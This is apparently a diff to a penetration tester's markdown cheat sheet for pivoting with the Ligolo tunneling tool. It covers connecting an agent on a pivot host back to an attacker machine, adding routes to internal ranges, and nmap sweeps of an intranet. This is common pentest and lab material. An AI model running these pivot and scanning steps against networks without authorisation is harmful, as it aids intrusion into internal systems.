@@ -2,8 +2,8 @@
 *   Setup
     *   Kali        → `ligstart()`
     *   Pivot     → `ligolo-agent -connect [KALI_IP]:11601 -ignore-cert`
-    *   Kali        → Select Session → `start` 
     *   Kali        → `sudo ip route add [ROUTE] dev ligolo`
+    *   Ligolo        → `session` -> Select Session → `start` 
 *   Local Forwarding
     *   Route    → `240.0.0.1`
     *   Access   → `240.0.0.1:[PORT]` (Universal IP - Change Session to access other pivots)
@@ -11,6 +11,7 @@
     *   Route → `[INTRANET_CIDR]`
         *   Linux        → `ip route`
         *   Windows → `route -n`
+        *   General Purpose -> `192.168.0.0/16`, `172.16.0.0/12`, `10.0.0.0/8`
     *   Network Scanning
         *   `sudo nmap -PE -sn  [INTRANET_CIDR]`
         *   `sudo nmap -PE -sCV [INTRANET_IP]`
